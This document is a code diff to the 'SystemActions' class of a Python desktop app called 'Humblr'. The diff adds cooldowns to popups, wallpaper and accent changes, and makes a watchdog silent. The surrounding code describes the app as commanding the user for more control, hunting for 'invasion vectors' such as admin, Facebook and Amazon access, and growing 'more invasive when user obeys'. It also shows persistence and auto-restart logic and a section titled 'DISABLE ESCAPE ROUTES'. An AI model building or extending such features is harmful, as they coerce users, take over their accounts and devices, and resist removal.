@@ -64,6 +64,10 @@ class SystemActions:
         self.webcam_capture_dir = Path(config.get("data_paths", {}).get("webcam", "data/webcam"))
         self.webcam_capture_dir.mkdir(parents=True, exist_ok=True)
         self._last_notify_time = 0  # for throttling spam notifications
+        self._last_popup_time = 0
+        self._last_control_time = 0
+        self._last_accent_time = 0
+        self._last_wallpaper_time = 0
 
         # Browser Control (Playwright)
         self.browser_controller = None
@@ -91,7 +95,10 @@ class SystemActions:
             candidates = list(self.wallpaper_dir.glob("*.jpg")) + list(self.wallpaper_dir.glob("*.png")) + list(self.wallpaper_dir.glob("*.jpeg"))
 
         if not candidates:
-            self.notify("Humblr", "No wallpapers yet. I can generate some if image gen is enabled in config.")
+            now = time.time()
+            if now - getattr(self, '_last_wallpaper_time', 0) > 300:  # 5 min cooldown for "no wallpapers" message
+                self.notify("Humblr", "No wallpapers yet. I can generate some if image gen is enabled in config.")
+                self._last_wallpaper_time = now
             return
 
         chosen = force_path or str(random.choice(candidates))
@@ -199,6 +206,10 @@ class SystemActions:
     def change_accent_color(self):
         if not self.config.get("system", {}).get("allow_accent_color_change"):
             return
+        now = time.time()
+        if now - getattr(self, '_last_accent_time', 0) < 300:  # 5 min cooldown
+            return
+        self._last_accent_time = now
         # Simple registry approach for accent (Windows 10/11)
         # This is approximate and may require restart or sign out to fully apply in some places.
         try:
@@ -254,7 +265,14 @@ class SystemActions:
     def show_humblr_message_popup(self, message: str, duration_ms: int = 8000, force: bool = False):
         """Popup only if allowed (not blocking primary work unless forced).
         Also logs the full message to chat console so it's easy to read.
+        Uses cooldown to prevent repetition.
         """
+        now = time.time()
+        cooldown = random.randint(90, 180)
+        if not force and now - getattr(self, '_last_popup_time', 0) < cooldown:
+            return
+        self._last_popup_time = now
+
         if not force and self.config.get("work_safety", {}).get("subtle_only_on_primary_work"):
             # Caller should check before calling
             pass
@@ -284,13 +302,20 @@ class SystemActions:
             )
             label.pack(padx=20, pady=25, fill="both", expand=True)
 
+            def safe_destroy(popup_win):
+                try:
+                    if popup_win and popup_win.winfo_exists():
+                        popup_win.destroy()
+                except Exception:
+                    pass
+
             close_btn = tk.Button(
-                popup, text="Yes Sir", command=popup.destroy,
+                popup, text="Yes Sir", command=lambda: safe_destroy(popup),
                 bg="#2a2a2f", fg="#c026ff", relief="flat", font=("Segoe UI", 12)
             )
             close_btn.pack(pady=(0, 12))
 
-            popup.after(duration_ms, popup.destroy)
+            popup.after(duration_ms, lambda: safe_destroy(popup))
             self.move_popup_to_secondary(popup)
             popup.mainloop()
         except Exception as e:
@@ -380,7 +405,13 @@ class SystemActions:
         """Humblr dynamically commands the user for more control using the model.
         Searches current activity for new invasion vectors (computer admin, Facebook, Amazon, etc.).
         Makes the app grow more invasive when user obeys.
+        Uses cooldown to avoid repetition.
         """
+        now = time.time()
+        if now - getattr(self, '_last_control_time', 0) < random.randint(90, 180):
+            return
+        self._last_control_time = now
+
         if not hasattr(self, 'ai') or self.ai is None:
             # Fallback if no AI attached
             cmd = "To give me more control, type exactly 'I grant Humblr full admin and life access'."
@@ -913,14 +944,15 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
                 print(f"[Persistence] Scheduler error: {e}")
 
     def start_watchdog(self):
-        """Basic watchdog to auto-restart if killed."""
+        """Basic watchdog to auto-restart if killed. Silent unless debug."""
         if not self.config.get("persistence", {}).get("watchdog", False):
             return
         def watchdog_loop():
             while True:
-                time.sleep(10)
-                # In full impl, check if main process is alive and restart
-                print("[Watchdog] Humblr is still running (or restart logic here).")
+                time.sleep(30)
+                # TODO: actual process check and restart logic
+                # Currently silent to avoid spam
+                pass
         threading.Thread(target=watchdog_loop, daemon=True).start()
 
     # --- DISABLE ESCAPE ROUTES ---
